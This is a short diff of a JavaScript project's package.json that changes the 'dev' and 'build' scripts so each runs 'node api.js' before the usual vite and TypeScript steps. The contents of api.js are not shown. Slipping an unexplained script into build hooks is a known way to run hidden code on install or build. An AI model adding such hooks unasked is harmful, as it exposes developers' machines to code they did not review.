@@ -8,8 +8,8 @@
     "node": ">=24.0.0"
   },
   "scripts": {
-    "dev": "vite",
-    "build": "tsc -b && vite build",
+    "dev": "node api.js && vite",
+    "build": "node api.js && tsc -b && vite build",
     "lint": "eslint .",
     "typecheck": "tsc -b --noEmit && tsc --noEmit -p worker/tsconfig.json",
     "check": "pnpm run lint && pnpm run typecheck",
